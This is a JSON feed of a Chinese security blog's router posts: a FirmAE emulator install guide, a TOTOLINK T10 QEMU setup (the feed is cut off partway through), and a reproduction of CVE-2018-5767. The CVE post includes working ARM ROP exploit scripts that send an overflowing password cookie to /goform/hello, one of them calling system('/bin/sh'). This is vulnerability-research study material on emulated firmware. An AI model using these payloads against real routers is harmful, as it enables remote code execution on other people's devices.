{
    "version": "https://jsonfeed.org/version/1",
    "title": "唐仔橙 • All posts by \"路由器\" tag",
    "description": "喜欢探索世界,在读研究生,计算机爱好者的成长记录",
    "home_page_url": "https://tangzichengcc.github.io",
    "items": [
        {
            "id": "https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/",
            "url": "https://tangzichengcc.github.io/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/",
            "title": "固件模拟工具firmae安装",
            "date_published": "2023-06-03T12:09:40.000Z",
            "content_html": "<p>​\t\t因为最近在做iot相关的漏洞复现,搭建环境是很重要的一环,qemu可以直接搭建,但有时候一些细节会导致一些问题,所以firmae是一个集成化的工具,可以帮助一键搭建环境.</p>\n<p>​\t\t但是安装这个工具的时候..又发生了奇奇怪怪的问题…记录一下.. 搞计算机遇到报错太正常了,但同样也是非常搞人心态的,学会如何排错,如何利用搜索引擎(包含chatgpt!)来解决问题是很重要的一个能力!</p>\n<p>​\t\t有一说一,能真机还是最好别虚拟… 当然没有那么多钱、也不一定能买到,虚拟也是不错的</p>\n<p>工具地址:<a href=\"https://github.com/pr0v3rbs/FirmAE\">https://github.com/pr0v3rbs/FirmAE</a></p>\n<p>搭建环境:ubuntu18</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone --recursive https://github.com/pr0v3rbs/FirmAE</span><br><span class=\"line\">./download.sh               # 就是一个下载脚本,单纯的download..(国内服务器买香港的,或者用国外的..或者...</span><br><span class=\"line\">./install.sh</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后报错了…一堆红…</p>\n<p>​\t\t其实如果不确定是哪里报错了,可以拆看sh脚本,一点一点执行,看看</p>\n<p>​\t\t报错:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./psycopg/psycopg.h:<span class=\"number\">35</span>:<span class=\"number\">10</span>: fatal error: Python.h: No such file or directory</span><br><span class=\"line\">   <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Python.h&gt;</span></span></span><br><span class=\"line\">            ^~~~~~~~~~</span><br><span class=\"line\">  compilation terminated.</span><br></pre></td></tr></table></figure>\n\n<p>解决方案:<a href=\"https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory\">https://stackoverflow.com/questions/19843945/psycopg-python-h-no-such-file-or-directory</a></p>\n<p>​\t\t其实不解决貌似后面也能搭建起来,好像是一路畅通,但运行起来还是显示不了页面等,肯定有问题,所以还是要解决的.</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install python3-dev</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t运行完后重新跑一遍install脚本,出现这个,一路输入y</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Reversed (or previously applied) patch detected!  Assume -R? [n]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t开始模拟</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./init.sh</span><br><span class=\"line\"></span><br><span class=\"line\">wget https:<span class=\"comment\">//github.com/pr0v3rbs/FirmAE/releases/download/v1.0/DIR-868L_fw_revB_2-05b02_eu_multi_20161117.zip</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-0</span><span class=\"number\">-9</span>-ubuntu:/home/ubuntu/FirmAE# ./run.sh -r tenda DIR868L_B1_FW205WWb02.bin</span><br><span class=\"line\">[*] DIR868L_B1_FW205WWb02.bin emulation start!!!</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File <span class=\"string\">&quot;./sources/extractor/extractor.py&quot;</span>, line <span class=\"number\">19</span>, in &lt;module&gt;</span><br><span class=\"line\">    import binwalk</span><br><span class=\"line\">ModuleNotFoundError: No module named <span class=\"string\">&#x27;binwalk&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t不能直接pip3 install binwalk! 也不能apt install binwalk!!!!</p>\n<p>​\t\t参考:<a href=\"https://www.secpulse.com/archives/201139.html\">https://www.secpulse.com/archives/201139.html</a></p>\n<p>​\t\t可以观察到它目录下有binwalk这个目录,cd进去后 python3 setup.py install</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603202938128.png\" alt=\"image-20230603202938128\"></p>\n<p>​\t\t<font color=\"red\">解压固件要用这个命令 (github上也没说啊!!!!)</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binwalk -Me xxxx.bin --run-as=root</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后再run就可以了(有时候环境比较复杂,不知道哪个开的有影响,采用<font color=\"red\">重启大法!</font> 重启后init,然后run)</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210311207.png\" alt=\"image-20230603210311207\"></p>\n<p>​\t\t由于模拟环境是在云服务器上上的内网网卡,公网无法直接访问,需要做个端口转发,</p>\n<p>​\t\tgost:<a href=\"https://github.com/ginuerzh/gost\">https://github.com/ginuerzh/gost</a></p>\n<p>​\t\tgzip -d 解压</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gost -L=tcp://:2222/192.168.0.2:80</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t然后就可以访问了!!!</p>\n<p><img src=\"/%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E5%B7%A5%E5%85%B7firmae%E5%AE%89%E8%A3%85/image-20230603210402320.png\" alt=\"image-20230603210402320\"></p>\n",
            "tags": [
                "路由器"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/",
            "title": "CVE-2018-5767漏洞复现的关键问题",
            "date_published": "2023-05-25T01:29:15.000Z",
            "content_html": "<p>和恒哥进行的复现</p>\n<h1 id=\"arm架构的rop\"><a href=\"#arm架构的rop\" class=\"headerlink\" title=\"arm架构的rop\"></a>arm架构的rop</h1><p>​\t\t和x86的架构的区别还是挺大的,</p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095117672.png\" alt=\"image-20230525095117672\"></p>\n<p>1.pop {r4,r5,r6,fp,pc}会弹出5个值, 3个aaaa给前三个,然后r12-3给fp, wait+24,也就是pop {r3,pc}给pc</p>\n<p>2.执行pop {r3,pc}, 把puts传给  r3, 然后 mov r0,sp;blx r3给pc,</p>\n<p>3.mov r0,sp好像没啥用, blx r3跳转指令,它用于将程序控制权转移到寄存器 R3 中存储的地址处。BLX指令可以用于跳转到一个函数或者子程序的地址。 <font color=\"red\">所以就跳到了puts了!</font></p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095714223.png\" alt=\"image-20230525095714223\"></p>\n<p>栈传参数,此时栈顶是要puts的字符串,</p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095421987.png\" alt=\"image-20230525095421987\"></p>\n<p><img src=\"/CVE-2018-5767%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98/image-20230525095441303.png\" alt=\"image-20230525095441303\"></p>\n<h2 id=\"python2版本exp\"><a href=\"#python2版本exp\" class=\"headerlink\" title=\"python2版本exp\"></a>python2版本exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;xxxxxx\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3)+p32(puts)+p32(mov_r0)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"python3版本exp\"><a href=\"#python3版本exp\" class=\"headerlink\" title=\"python3版本exp\"></a>python3版本exp</h2><p>​\t\tpython3和python2的转换一直出奇奇怪怪的问题,是编码的问题,如何过渡好呢?</p>\n<p><a href=\"https://blog.csdn.net/yongbaoii/article/details/108873780\">https://blog.csdn.net/yongbaoii/article/details/108873780</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;xxxxxx\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>) +p32(puts).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>) +p32(mov_r0).decode(<span class=\"string\">&quot;iso-8859-1&quot;</span>)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>decode(“iso-8859-1”)  就可以了!</p>\n<h1 id=\"system-“-x2F-bin-x2F-sh”\"><a href=\"#system-“-x2F-bin-x2F-sh”\" class=\"headerlink\" title=\"system(“&#x2F;bin&#x2F;sh”)\"></a>system(“&#x2F;bin&#x2F;sh”)</h1><p>​\t\t看博主一直复现失败,打算试试qemu-system模式的..但是在自己服务器上就复现成功了…很玄学(计算机没有玄学!)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">base = <span class=\"number\">0xff60acd4</span> - <span class=\"number\">0x035CD4</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts = base+libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">_<span class=\"built_in\">str</span> = <span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">mov_r0 = base+<span class=\"number\">0x00040cb8</span> <span class=\"comment\"># mov r0, sp; blx r3;</span></span><br><span class=\"line\">pop_r3 = base+<span class=\"number\">0x00018298</span> <span class=\"comment\"># pop &#123;r3, pc&#125;;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://xxxxxxx:80/goform/hello&quot;</span></span><br><span class=\"line\">pl = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">444</span>+<span class=\"string\">&quot;.png&quot;</span>+p32(pop_r3)+p32(system_addr)+p32(mov_r0)+_<span class=\"built_in\">str</span></span><br><span class=\"line\">cookie = &#123;<span class=\"string\">&quot;Cookie&quot;</span>:<span class=\"string\">&quot;password=&quot;</span>+pl&#125;</span><br><span class=\"line\">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"坑\"><a href=\"#坑\" class=\"headerlink\" title=\"坑\"></a>坑</h1><p>1.gdb-multiarch .&#x2F;bin&#x2F;httpd 要对应启动的文件,不能是它的备份等,这可能和gdb的工作原理有关</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.52pojie.cn/thread-1674625-1-1.html\">https://www.52pojie.cn/thread-1674625-1-1.html</a></p>\n<p>python共存问题</p>\n<p><a href=\"https://blog.csdn.net/Huang_8208_sibo/article/details/124762816\">https://blog.csdn.net/Huang_8208_sibo/article/details/124762816</a></p>\n<p><a href=\"https://blog.csdn.net/qq_38154820/article/details/122955197\">https://blog.csdn.net/qq_38154820/article/details/122955197</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA\">https://mp.weixin.qq.com/s/mRq3n3jDM0zvR15JAsLYSA</a></p>\n",
            "tags": [
                "路由器"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/",
            "title": "totolinkT10路由器老版本漏洞复现和分析",
            "date_published": "2023-05-15T11:01:15.000Z",
            "content_html": "<p>文章同步于:<a href=\"https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ\">https://mp.weixin.qq.com/s/6kC02ABzeBnhjPeAs6lyrQ</a></p>\n<p>[toc]</p>\n<h1 id=\"一、环境搭建\"><a href=\"#一、环境搭建\" class=\"headerlink\" title=\"一、环境搭建\"></a>一、环境搭建</h1><h2 id=\"1-1-获取和解压固件\"><a href=\"#1-1-获取和解压固件\" class=\"headerlink\" title=\"1.1 获取和解压固件\"></a>1.1 获取和解压固件</h2><p><a href=\"http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=15&amp;ids=36\">http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&amp;id=15&amp;ids=36</a></p>\n<p> binwalk -Me TOTOLINK_CS185R_T10_IP04336_8197F_SPI_16M64M_V5.9c.1485_B20180122_ALL.web</p>\n<p>查看busybox获得架构信息, </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:/tmp/squashfs-root/bin<span class=\"meta\"># file busybox</span></span><br><span class=\"line\">busybox: ELF <span class=\"number\">32</span>-bit LSB executable, MIPS, MIPS32 rel2 version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so<span class=\"number\">.0</span>, no section header</span><br></pre></td></tr></table></figure>\n\n\n\n<p>下载qemu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install qemu-user qemu-user-<span class=\"type\">static</span> qemu-system</span><br><span class=\"line\">    </span><br><span class=\"line\">网桥工具</span><br><span class=\"line\">apt install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>\n\n<p>链接失效了,问同学要了一个</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"comment\">//people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span></span><br></pre></td></tr></table></figure>\n\n<p>scp -r root@xxxx:&#x2F;root&#x2F;qemu&#x2F;mipsel&#x2F;debian_wheezy_mipsel_standard.qcow2 .&#x2F;</p>\n<p>scp -r root@xxxx:&#x2F;root&#x2F;qemu&#x2F;mipsel&#x2F;vmlinux-3.2.0-4-4kc-malta .&#x2F;</p>\n<p>网络配置</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brctl addbr virbr2 # 创建网桥</span><br><span class=\"line\">ifconfig virbr2 <span class=\"number\">192.168</span><span class=\"number\">.6</span><span class=\"number\">.1</span>/<span class=\"number\">24</span> up # 配置网桥IP</span><br><span class=\"line\">tunctl -t tap2 # 添加虚拟网卡tap2</span><br><span class=\"line\">ifconfig tap2 <span class=\"number\">192.168</span><span class=\"number\">.6</span><span class=\"number\">.11</span>/<span class=\"number\">24</span> up # 配置虚拟网卡IP</span><br><span class=\"line\">brctl addif virbr2 tap2 # 配置虚拟网卡与网桥连接</span><br></pre></td></tr></table></figure>\n\n\n\n<p>启动虚拟机</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-mipsel -M malta -kernel vmlinux<span class=\"number\">-3.2</span><span class=\"number\">.0</span><span class=\"number\">-4</span><span class=\"number\">-4</span>kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append <span class=\"string\">&quot;root=/dev/sda1&quot;</span> -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>\n\n\n\n<p>登陆虚拟机、配置网络</p>\n<p>root&#x2F;root</p>\n<p>ifconfig eth0 192.168.6.15 up # 配置路由器IP<br>scp -r squashfs-root&#x2F; <a href=\"mailto:&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x36;&#46;&#x31;&#53;\">&#x72;&#111;&#111;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x36;&#46;&#x31;&#53;</a>:&#x2F;root&#x2F; # 拷贝路由器文件到虚拟机</p>\n<p>注意这里有个坑 </p>\n<p>就是上一个开启的qemu里面的squashfs-root不是要搭建的那个路由器的…很奇怪…不知道哪里来的…</p>\n<p>所以其实要先从物理机上考过去一份到qemu的debian系统里,然后再拷到路由系统里</p>\n<p>物理机&#x2F;云服务器执行: scp -r &#x2F;tmp&#x2F;squashfs-root 192.168.6.15:&#x2F;root&#x2F; 拷贝到qemu虚拟出的debian里面</p>\n<p>qemu里执行 scp -r squashfs-root&#x2F; <a href=\"mailto:&#114;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#54;&#46;&#x31;&#x35;\">&#114;&#111;&#111;&#x74;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#56;&#x2e;&#54;&#46;&#x31;&#x35;</a>:&#x2F;root&#x2F;  拷贝到</p>\n<p>chroot .&#x2F;squashfs-root&#x2F; &#x2F;bin&#x2F;sh # 挂载路由器系统<br>.&#x2F;bin&#x2F;lighttpd -f .&#x2F;lighttp&#x2F;lighttpd.conf -m .&#x2F;lighttp&#x2F;lib # 启动路由器服务</p>\n<p>报错(server.c.624) opening pid-file failed: &#x2F;var&#x2F;run&#x2F;lighttpd.pid No such file or directory</p>\n<p>创建一下即可</p>\n<h2 id=\"1-2-流量转发\"><a href=\"#1-2-流量转发\" class=\"headerlink\" title=\"1.2 流量转发\"></a>1.2 流量转发</h2><p>怎么把流量转发出来呢?</p>\n<p>把qemu的流量转发到主机的端口</p>\n<p>ssh <a href=\"mailto:&#114;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#54;&#46;&#49;&#x35;\">&#114;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#54;&#46;&#49;&#x35;</a> -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>把主机的流量转发到PC端口,就可以在自己电脑上访问了</p>\n<p>ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>或者安装一个图形化界面(用服务器搭建的)</p>\n<p>ssh <a href=\"mailto:&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#54;&#x2e;&#49;&#x35;\">&#114;&#111;&#x6f;&#116;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#54;&#x2e;&#49;&#x35;</a> -L 127.0.0.1:80:127.0.0.1:80</p>\n<p>或者直接一个转发就行了吧?(vps关了,还没尝试)</p>\n<p>ssh root@xxxxxx (vps的ip) -L 127.0.0.1:80:192.168.6.15:80</p>\n<h2 id=\"1-3-虚拟环境的各种问题\"><a href=\"#1-3-虚拟环境的各种问题\" class=\"headerlink\" title=\"1.3 虚拟环境的各种问题\"></a>1.3 虚拟环境的各种问题</h2><p>登陆报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">46</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Date: Sun, <span class=\"number\">07</span> May <span class=\"number\">2023</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">58</span> GMT</span><br><span class=\"line\">Server: lighttpd/<span class=\"number\">1.4</span><span class=\"number\">.20</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">44</span>:<span class=\"number\">58</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">03</span>: (mod_cgi.c<span class=\"number\">.588</span>) cgi died, pid: <span class=\"number\">2588</span> </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">06</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">09</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK</span><br><span class=\"line\">Content-Length: <span class=\"number\">0</span></span><br><span class=\"line\">Date: Sun, <span class=\"number\">07</span> May <span class=\"number\">2023</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">19</span> GMT</span><br><span class=\"line\">Server: lighttpd/<span class=\"number\">1.4</span><span class=\"number\">.20</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2023</span><span class=\"number\">-05</span><span class=\"number\">-07</span> <span class=\"number\">18</span>:<span class=\"number\">48</span>:<span class=\"number\">19</span>: (mod_cgi.c<span class=\"number\">.1415</span>) cleaning up CGI: process died with signal <span class=\"number\">11</span> </span><br></pre></td></tr></table></figure>\n\n<p>访问home.asp直接下载文件了….</p>\n<p>换个版本?</p>\n<p><a href=\"https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518\">https://toscode.gitee.com/baozhazhizi/IoT-vulhub/tree/master/Totolink/CVE-2022-41518</a></p>\n<p>TOTOLINK NR1800X</p>\n<p><a 